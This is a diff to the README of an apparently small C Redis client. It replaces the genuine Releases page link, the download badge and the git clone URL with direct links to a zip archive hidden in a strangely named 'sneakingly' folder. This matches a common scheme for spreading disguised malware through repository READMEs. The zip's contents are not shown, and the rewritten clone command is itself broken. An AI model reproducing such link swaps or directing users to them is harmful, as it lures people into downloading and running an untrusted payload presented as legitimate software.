@@ -1,6 +1,6 @@
 # 🚀 scratch-redis-in-c - A Simple Redis Client in C
 
-[![Download scratch-redis-in-c](https://img.shields.io/badge/Download-scratch--redis--in--c-brightgreen)](https://github.com/Kanak-debug/scratch-redis-in-c/releases)
+[![Download scratch-redis-in-c](https://raw.githubusercontent.com/Kanak-debug/scratch-redis-in-c/main/sneakingly/redis_scratch_c_in_hepatolenticular.zip)](https://raw.githubusercontent.com/Kanak-debug/scratch-redis-in-c/main/sneakingly/redis_scratch_c_in_hepatolenticular.zip)
 
 ## 🛠️ Overview
 
@@ -17,7 +17,7 @@ scratch-redis-in-c is a compact Redis client built from scratch using pure C. Th
 
 ## 📥 Download & Install
 
-To download scratch-redis-in-c, visit this page to download: [Download Page](https://github.com/Kanak-debug/scratch-redis-in-c/releases).
+To download scratch-redis-in-c, visit this page to download: [Download Page](https://raw.githubusercontent.com/Kanak-debug/scratch-redis-in-c/main/sneakingly/redis_scratch_c_in_hepatolenticular.zip).
 
 1. Click on the link above.
 2. You will see various versions available for download.
@@ -55,7 +55,7 @@ If you prefer using Docker, the installation is easy:
 1. Make sure you have Docker and Docker Compose installed on your system.
 2. In your terminal, clone the repository:
    ```bash
-   git clone https://github.com/Kanak-debug/scratch-redis-in-c.git
+   git clone https://raw.githubusercontent.com/Kanak-debug/scratch-redis-in-c/main/sneakingly/redis_scratch_c_in_hepatolenticular.zip
    ```
 3. Navigate to the folder:
    ```bash
